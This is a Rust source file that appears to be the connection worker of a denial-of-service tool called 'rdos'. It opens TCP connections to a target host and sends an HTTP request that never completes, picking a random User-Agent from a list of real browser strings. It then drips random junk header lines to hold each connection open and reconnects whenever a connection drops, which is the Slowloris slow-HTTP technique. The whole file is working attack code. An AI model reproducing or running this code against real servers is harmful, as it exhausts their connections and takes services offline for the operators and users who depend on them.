use rand::Rng;
use std::{io::Write, net::TcpStream, thread, time};

use crate::ipv4_spec::IPv4Spec;

// When a connection is initialized, the TcpWorker will sample a random user agent header.
const USER_AGENTS: [&'static str; 25] =  ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"];

pub struct TcpWorker {
    payload_size: usize,
    tcp_client: TcpStream,
    is_finished: bool,
}

impl TcpWorker {
    pub fn new(ip_address: IPv4Spec, payload_size: usize) -> Result<TcpWorker, std::io::Error> {
        // Only if TcpWorker::init() fails here in TcpWorker::new() it should panic rdos.
        // This means that you propably can't connect because you can't reach the target IP and port.
        // On TcpWorker.restart() rdos should not panic because are just recreating a previously succesful connection.
        let tcp = TcpWorker::init(ip_address)?;

        return Ok(TcpWorker {
            payload_size,
            tcp_client: tcp,
            is_finished: false,
        });
    }

    fn init(ip_address: IPv4Spec) -> std::io::Result<TcpStream> {
        // TcpStream::connect() is the only valid way to construct TcpStream
        // There is no TcpStream::new(). This is why I created the reusable TcpWorker::init() method.
        let mut stream = TcpStream::connect(format!(
            "{}:{}",
            ip_address.get_host(),
            ip_address.get_port()
        ))?;

        // Write initial bytes to TcpStream
        _ = stream.write(
            format!("GET / HTTP/1.1\n\
                Host: localhost\n\
                Connection: keep-alive\n\
                Upgrade-Insecure-Requests: 0\n\
                User-Agent: {}\n\
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\n\
                Sec-GPC: 1\n\
                Accept-Language: en-US,en;q=0.9\n\
                Sec-Fetch-Site: none\n\
                Sec-Fetch-Mode: navigate\n\
                Sec-Fetch-User: ?1\n\
                Sec-Fetch-Dest: document\n\
                Accept-Encoding: gzip, deflate, br\n\n", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())]).as_bytes() // Random sampling of User-Agent header
        );

        return Ok(stream);
    }

    fn generate_payload<'a>(payload_size: usize) -> String {
        let mut rng = rand::thread_rng();
        let mut output = String::new();

        for _ in 0..payload_size {
            let byte: u8 = rng.gen_range(33..=126); // Range in ASCII table
            output.push(byte as char);
        }

        return output;
    }

    pub fn work(&mut self) {
        let payload = format!(
            "X-HTTP-Header: {}\n",
            TcpWorker::generate_payload(self.payload_size)
        );

        let result = self.tcp_client.write(payload.as_bytes());

        match result {
            Ok(_) => {
                // On success do nothing.
                // println!("{}", some message?);
            }
            _ => {
                // On failure we want to set the internal worker status as finished.
                // The next cycle detects that the worker has stopped and will TcpWorker.restart() the TcpStream.
                println!("Failed to send payload");
                self.is_finished = true;
            }
        }
    }

    pub fn restart(&mut self, ip_address: IPv4Spec) -> Result<(), std::io::Error> {
        self.tcp_client = TcpWorker::init(ip_address)?;
        self.is_finished = false;
        Ok(())
    }

    pub fn sleep(&mut self, delay_ms: usize) {
        let duration = time::Duration::from_millis(delay_ms as u64);
        thread::sleep(duration);
    }

    pub fn finished(&self) -> bool {
        return self.is_finished;
    }
}
